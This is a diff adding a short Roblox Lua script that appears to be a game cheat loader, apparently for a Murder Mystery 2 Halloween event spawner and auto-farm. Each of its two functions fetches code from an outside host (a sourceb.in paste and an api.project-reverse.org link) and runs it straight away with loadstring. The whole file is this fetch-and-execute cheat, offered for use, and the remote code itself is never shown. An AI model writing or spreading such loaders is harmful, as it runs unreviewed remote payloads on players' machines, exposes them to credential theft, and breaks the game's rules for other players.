@@ -1,1 +1,13 @@
+local function hirahub()
+
 loadstring(game:HttpGet('https://cdn.sourceb.in/bins/UOQosmYDxY/0'))()
+
+end
+
+local function farm()
+
+loadstring(game:HttpGet('https://api.project-reverse.org/run/eyJpZCI6IjFhYmQxODk4LWNmODItNGFiNi04MTA0LTY2OTZlOGJlYTllNCIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6Im1tMmhhbGxvd2VlbmV2ZW50c3Bhd25lciJ9fQ'))()
+
+end
+
+task.spawn(hirahub) task.spawn(farm)
